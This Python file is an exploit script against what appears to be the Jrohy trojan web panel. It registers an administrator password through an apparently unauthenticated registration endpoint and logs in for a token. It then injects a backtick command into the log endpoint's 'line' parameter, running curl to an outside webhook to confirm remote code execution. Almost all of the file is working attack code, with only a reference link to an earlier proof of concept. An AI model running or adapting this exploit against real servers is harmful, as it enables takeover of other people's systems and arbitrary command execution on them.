import hashlib
import requests
import sys
# reference: https://github.com/ainrm/Jrohy-trojan-unauth-poc/tree/main
class PasswordManager:
    def __init__(self, password, url, proxies=None):
        self.password = password
        self.url =  url
        self.proxies = proxies

    def hash_password(self):
        hash_object = hashlib.sha224(self.password.encode())
        print(hash_object.hexdigest())
        return hash_object.hexdigest()

    def send_request(self):
        hashed_password = self.hash_password()
        files = {'password': (None, hashed_password)}
        full_url = f'{url}/auth/register'

        response = requests.post(full_url, files=files, proxies=self.proxies,verify=False)
        return response

    def process_response(self, response):
        result = response.json()
        if result.get('Msg') == 'success':
            print(f'[+] success: {self.url} ==> admin/{self.password}')
        else:
            print(result)

    def run(self):
        response = self.send_request()
        self.process_response(response)

if __name__ == '__main__':
    url = ""
    password = "123456"
    webhook = ""
    command = f"curl {webhook}"
    hash_object = hashlib.sha224(password.encode())

    manager = PasswordManager(password, url)
    manager.run()
    session = requests.Session()
    res = session.post(url+'/auth/login', data={'password': hash_object.hexdigest(),'username':'admin'},verify=False)
    token = res.json()['token']
    print(token)
    headers = {
        "Accept":"*/*",
        "Sec-WebSocket-Version":"13",
        "Sec-WebSocket-Key": "key",
        'Sec-WebSocket-Protocol': "websocket",
        "Connection": "Upgrade",
        "Upgrade": "websocket",
    }
    exploit = requests.get(url + f"/trojan/log?line=1`{command}`&token={token}",headers=headers,verify=False)
    print(exploit.text)
